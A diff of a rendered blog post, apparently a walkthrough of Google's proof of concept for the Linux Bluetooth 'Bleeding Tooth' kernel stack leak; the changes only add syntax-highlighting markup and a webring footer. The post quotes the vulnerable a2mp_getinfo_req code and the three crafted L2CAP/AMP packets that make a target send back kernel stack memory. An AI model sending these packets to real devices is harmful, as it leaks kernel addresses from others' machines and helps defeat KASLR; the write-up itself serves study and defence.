@@ -181,7 +181,7 @@ The vulnerability itself, dubbed Bleeding Tooth by Google, is able to leak value
 <p>The vulnerability itself, dubbed <em>Bleeding Tooth</em> by Google, is able to leak values from the kernel&rsquo;s stack memory. This means that, in theory, you might be able to defeat kaslr and leverage that information in a fully-fledged exploit.</p>
 <h1 id="spot-the-vuln">Spot The Vuln<a href="#spot-the-vuln" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>To start off, it&rsquo;s a good idea to look at the kernel source itself. The vulnerable function is <a href="https://github.com/torvalds/linux/blob/97fb5e8d9b57f10f294303c9a5d1bd033eded6bf/net/bluetooth/a2mp.c#L291"><code>a2mp_getinfo_req()</code></a>. Specifically, starting at <a href="https://github.com/torvalds/linux/blob/97fb5e8d9b57f10f294303c9a5d1bd033eded6bf/net/bluetooth/a2mp.c#L304">line 304</a>, we have:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>hdev <span style="color:#f92672">=</span> hci_dev_get(req<span style="color:#f92672">-&gt;</span>id);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>hdev <span style="color:#f92672">=</span> <span style="color:#a6e22e">hci_dev_get</span>(req<span style="color:#f92672">-&gt;</span>id);
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>hdev <span style="color:#f92672">||</span> hdev<span style="color:#f92672">-&gt;</span>dev_type <span style="color:#f92672">!=</span> HCI_AMP)
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> a2mp_info_rsp rsp;
@@ -189,7 +189,7 @@ The vulnerability itself, dubbed Bleeding Tooth by Google, is able to leak value
 </span></span><span style="display:flex;"><span>    rsp.id <span style="color:#f92672">=</span> req<span style="color:#f92672">-&gt;</span>id;
 </span></span><span style="display:flex;"><span>    rsp.status <span style="color:#f92672">=</span> A2MP_STATUS_INVALID_CTRL_ID;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    a2mp_send(mgr, A2MP_GETINFO_RSP, hdr<span style="color:#f92672">-&gt;</span>ident, <span style="color:#66d9ef">sizeof</span>(rsp),
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">a2mp_send</span>(mgr, A2MP_GETINFO_RSP, hdr<span style="color:#f92672">-&gt;</span>ident, <span style="color:#66d9ef">sizeof</span>(rsp),
 </span></span><span style="display:flex;"><span>            <span style="color:#f92672">&amp;</span>rsp);
 </span></span><span style="display:flex;"><span>    
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">goto</span> done;
@@ -207,7 +207,7 @@ The vulnerability itself, dubbed Bleeding Tooth by Google, is able to leak value
 </span></span></code></pre></div><p>The trouble is that space for this struct is allocated on the stack, so the rest of those fields are going to already be populated with junk left over from whatever was going on in that region of memory before. Herein lies the issue - that <em>junk</em> is likely to contain kernel addresses which are being sent over Bluetooth to another device! This is what constitutes the information leak.</p>
 <h1 id="triggering-the-bug">Triggering The Bug<a href="#triggering-the-bug" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>So, a nice bug for sure - but how do we trigger it? Let&rsquo;s take another look at that <code>if</code> statement:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>hdev <span style="color:#f92672">=</span> hci_dev_get(req<span style="color:#f92672">-&gt;</span>id);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>hdev <span style="color:#f92672">=</span> <span style="color:#a6e22e">hci_dev_get</span>(req<span style="color:#f92672">-&gt;</span>id);
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>hdev <span style="color:#f92672">||</span> hdev<span style="color:#f92672">-&gt;</span>dev_type <span style="color:#f92672">!=</span> HCI_AMP)
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* ... */</span>
@@ -226,16 +226,16 @@ The vulnerability itself, dubbed Bleeding Tooth by Google, is able to leak value
 </ul>
 <p>This is precisely what the Google team&rsquo;s <a href="https://github.com/google/security-research/security/advisories/GHSA-7mh3-gq28-gfrq">poc</a> does. The first thing it does is resets the Bluetooth device, and the initiates a connection to the target MAC address. After all that is done, we get to constructing and sending the three packets.</p>
 <p>Now comes packet 1:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>printf(<span style="color:#e6db74">&#34;[*] Creating AMP channel...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Creating AMP channel...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> {
 </span></span><span style="display:flex;"><span>    l2cap_hdr hdr;
 </span></span><span style="display:flex;"><span>} packet1 <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
-</span></span><span style="display:flex;"><span>packet1.hdr.len <span style="color:#f92672">=</span> htobs(<span style="color:#66d9ef">sizeof</span>(packet1) <span style="color:#f92672">-</span> L2CAP_HDR_SIZE);
-</span></span><span style="display:flex;"><span>packet1.hdr.cid <span style="color:#f92672">=</span> htobs(AMP_MGR_CID);
-</span></span><span style="display:flex;"><span>hci_send_acl_data(hci_socket, hci_handle, <span style="color:#f92672">&amp;</span>packet1, <span style="color:#66d9ef">sizeof</span>(packet1));
+</span></span><span style="display:flex;"><span>packet1.hdr.len <span style="color:#f92672">=</span> <span style="color:#a6e22e">htobs</span>(<span style="color:#66d9ef">sizeof</span>(packet1) <span style="color:#f92672">-</span> L2CAP_HDR_SIZE);
+</span></span><span style="display:flex;"><span>packet1.hdr.cid <span style="color:#f92672">=</span> <span style="color:#a6e22e">htobs</span>(AMP_MGR_CID);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">hci_send_acl_data</span>(hci_socket, hci_handle, <span style="color:#f92672">&amp;</span>packet1, <span style="color:#66d9ef">sizeof</span>(packet1));
 </span></span></code></pre></div><p>This packet is just an <code>L2CAP</code> header (defined in <a href="https://github.com/torvalds/linux/blob/071a0578b0ce0b0e543d1e38ee6926b9cc21c198/include/net/bluetooth/l2cap.h#L206"><code>include/net/bluetooth/l2cap.h</code></a>) consisting of a packet length (<code>len</code>) and a channel identifier (<code>cid</code>). This channel identifier is set to <code>AMP_MGR_CID</code> (defined to be <code>0x03</code>). Once this packet is sent, we know that the vulnerable code will eventually be called, but at this point the <code>if</code> statement will fail and we won&rsquo;t get any goodies sent back to us.</p>
 <p>Moving onwards, we get to packet 2:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>printf(<span style="color:#e6db74">&#34;[*] Configuring to L2CAP_MODE_BASIC...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Configuring to L2CAP_MODE_BASIC...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> {
 </span></span><span style="display:flex;"><span>    l2cap_hdr hdr;
 </span></span><span style="display:flex;"><span>    l2cap_cmd_hdr cmd_hdr;
@@ -243,33 +243,33 @@ The vulnerability itself, dubbed Bleeding Tooth by Google, is able to leak value
 </span></span><span style="display:flex;"><span>    l2cap_conf_opt conf_opt;
 </span></span><span style="display:flex;"><span>    l2cap_conf_rfc conf_rfc;
 </span></span><span style="display:flex;"><span>} packet2 <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
-</span></span><span style="display:flex;"><span>packet2.hdr.len <span style="color:#f92672">=</span> htobs(<span style="color:#66d9ef">sizeof</span>(packet2) <span style="color:#f92672">-</span> L2CAP_HDR_SIZE);
-</span></span><span style="display:flex;"><span>packet2.hdr.cid <span style="color:#f92672">=</span> htobs(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>packet2.hdr.len <span style="color:#f92672">=</span> <span style="color:#a6e22e">htobs</span>(<span style="color:#66d9ef">sizeof</span>(packet2) <span style="color:#f92672">-</span> L2CAP_HDR_SIZE);
+</span></span><span style="display:flex;"><span>packet2.hdr.cid <span style="color:#f92672">=</span> <span style="color:#a6e22e">htobs</span>(<span style="color:#ae81ff">1</span>);
 </span></span><span style="display:flex;"><span>packet2.cmd_hdr.code <span style="color:#f92672">=</span> L2CAP_CONF_RSP;
 </span></span><span style="display:flex;"><span>packet2.cmd_hdr.ident <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x41</span>;
-</span></span><span style="display:flex;"><span>packet2.cmd_hdr.len <span style="color:#f92672">=</span> htobs(<span style="color:#66d9ef">sizeof</span>(packet2) <span style="color:#f92672">-</span> L2CAP_HDR_SIZE <span style="color:#f92672">-</span> L2CAP_CMD_HDR_SIZE);
-</span></span><span style="display:flex;"><span>packet2.conf_rsp.scid <span style="color:#f92672">=</span> htobs(AMP_MGR_CID);
-</span></span><span style="display:flex;"><span>packet2.conf_rsp.flags <span style="color:#f92672">=</span> htobs(<span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>packet2.conf_rsp.result <span style="color:#f92672">=</span> htobs(L2CAP_CONF_UNACCEPT);
+</span></span><span style="display:flex;"><span>packet2.cmd_hdr.len <span style="color:#f92672">=</span> <span style="color:#a6e22e">htobs</span>(<span style="color:#66d9ef">sizeof</span>(packet2) <span style="color:#f92672">-</span> L2CAP_HDR_SIZE <span style="color:#f92672">-</span> L2CAP_CMD_HDR_SIZE);
+</span></span><span style="display:flex;"><span>packet2.conf_rsp.scid <span style="color:#f92672">=</span> <span style="color:#a6e22e">htobs</span>(AMP_MGR_CID);
+</span></span><span style="display:flex;"><span>packet2.conf_rsp.flags <span style="color:#f92672">=</span> <span style="color:#a6e22e">htobs</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>packet2.conf_rsp.result <span style="color:#f92672">=</span> <span style="color:#a6e22e">htobs</span>(L2CAP_CONF_UNACCEPT);
 </span></span><span style="display:flex;"><span>packet2.conf_opt.type <span style="color:#f92672">=</span> L2CAP_CONF_RFC;
 </span></span><span style="display:flex;"><span>packet2.conf_opt.len <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(l2cap_conf_rfc);
 </span></span><span style="display:flex;"><span>packet2.conf_rfc.mode <span style="color:#f92672">=</span> L2CAP_MODE_BASIC;
-</span></span><span style="display:flex;"><span>hci_send_acl_data(hci_socket, hci_handle, <span style="color:#f92672">&amp;</span>packet2, <span style="color:#66d9ef">sizeof</span>(packet2));
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">hci_send_acl_data</span>(hci_socket, hci_handle, <span style="color:#f92672">&amp;</span>packet2, <span style="color:#66d9ef">sizeof</span>(packet2));
 </span></span></code></pre></div><p>Before we can send a corrupt AMP packet with a nonsense request ID, we have to establish with the target that we&rsquo;re using the L2CAP protocol. This packet has a lot of fields that we don&rsquo;t really care about, but the important struct to look at is <a href="https://github.com/torvalds/linux/blob/071a0578b0ce0b0e543d1e38ee6926b9cc21c198/include/net/bluetooth/l2cap.h#L349"><code>l2cap_conf_rfc</code></a>. This is where the protocol is actually set (although, given the rest of the packet, anything other than L2CAP wouldn&rsquo;t make any sense). We can see this on the penultimate line where the <code>.mode</code> field of <code>conf_rfc</code> is set to <code>L2CAP_MODE_BASIC</code>.</p>
 <p>Once this packet is sent, we can send another one with an AMP packet encapsulated in an L2CAP packet, which brings us to packet 3:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>printf(<span style="color:#e6db74">&#34;[*] Sending malicious AMP info request...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Sending malicious AMP info request...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> {
 </span></span><span style="display:flex;"><span>    l2cap_hdr hdr;
 </span></span><span style="display:flex;"><span>    amp_mgr_hdr amp_hdr;
 </span></span><span style="display:flex;"><span>    amp_info_req_parms info_req;
 </span></span><span style="display:flex;"><span>} packet3 <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
-</span></span><span style="display:flex;"><span>packet3.hdr.len <span style="color:#f92672">=</span> htobs(<span style="color:#66d9ef">sizeof</span>(packet3) <span style="color:#f92672">-</span> L2CAP_HDR_SIZE);
-</span></span><span style="display:flex;"><span>packet3.hdr.cid <span style="color:#f92672">=</span> htobs(AMP_MGR_CID);
+</span></span><span style="display:flex;"><span>packet3.hdr.len <span style="color:#f92672">=</span> <span style="color:#a6e22e">htobs</span>(<span style="color:#66d9ef">sizeof</span>(packet3) <span style="color:#f92672">-</span> L2CAP_HDR_SIZE);
+</span></span><span style="display:flex;"><span>packet3.hdr.cid <span style="color:#f92672">=</span> <span style="color:#a6e22e">htobs</span>(AMP_MGR_CID);
 </span></span><span style="display:flex;"><span>packet3.amp_hdr.code <span style="color:#f92672">=</span> AMP_INFO_REQ;
 </span></span><span style="display:flex;"><span>packet3.amp_hdr.ident <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x41</span>;
-</span></span><span style="display:flex;"><span>packet3.amp_hdr.len <span style="color:#f92672">=</span> htobs(<span style="color:#66d9ef">sizeof</span>(amp_info_req_parms));
+</span></span><span style="display:flex;"><span>packet3.amp_hdr.len <span style="color:#f92672">=</span> <span style="color:#a6e22e">htobs</span>(<span style="color:#66d9ef">sizeof</span>(amp_info_req_parms));
 </span></span><span style="display:flex;"><span>packet3.info_req.id <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x42</span>; <span style="color:#75715e">// use a dummy id to make hci_dev_get fail
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>hci_send_acl_data(hci_socket, hci_handle, <span style="color:#f92672">&amp;</span>packet3, <span style="color:#66d9ef">sizeof</span>(packet3));
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">hci_send_acl_data</span>(hci_socket, hci_handle, <span style="color:#f92672">&amp;</span>packet3, <span style="color:#66d9ef">sizeof</span>(packet3));
 </span></span></code></pre></div><p>Notice how, in the definition of <code>packet3</code>, we start off with an <code>l2cap_hdr</code>, followed by an <code>amp_mgr_hdr</code> and an <code>amp_info_req_parms</code> payload. We can only do this because we sent <code>packet2</code>, which instructed the target device that we are using <code>l2cap</code> to encapsulate our packets.</p>
 <p>There are two important parts to this packet. First, we set the <code>.code</code> field of the <code>amp_hdr</code> to <code>AMP_INFO_REQ</code> - this ensures that the vulnerable <code>a2mp_getinfo_req()</code> function in the kernel will get called. The second, crucial part of the whole poc, is that we set <code>.id</code> field of the <code>info_req</code> payload to <code>0x42</code>. This number has no inherent meaning in the Bluetooth stack, so when the kernel calls <code>hci_dev_get()</code> on this packet, it will get a valid pointer back, but the <code>.dev_type</code> field of <code>hdev</code> will <em>not</em> be <code>HCI_AMP</code>. This will make the <code>if</code> condition fail, and the kernel will jump to the vulnerable code.</p>
 <h1 id="the-goods">The Goods<a href="#the-goods" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
@@ -347,6 +347,21 @@ The vulnerability itself, dubbed Bleeding Tooth by Google, is able to leak value
 
 <script src="/assets/main.js"></script>
 <script src="/assets/prism.js"></script>
+
+<div class="footer__webring">
+    <span>
+        <div>
+            this site is part of the <a href='https://pixeldreams.tokyo/cgi-bin/webring.cgi'>HauNTed wEbriNg</a>
+        </div>
+        <div>
+            <p>
+                <a href='https://pixeldreams.tokyo/cgi-bin/webring.cgi?before=https://xcellerator.github.io/'>&lt;&lt;&lt;</a>
+                <a href='https://pixeldreams.tokyo/cgi-bin/webring.cgi?random=https://xcellerator.github.io/'>RaNDom</a>
+                <a href='https://pixeldreams.tokyo/cgi-bin/webring.cgi?after=https://xcellerator.github.io/'>&gt;&gt;&gt;</a>
+            </p>
+        </div>
+    </span>
+</div>
 
 
 
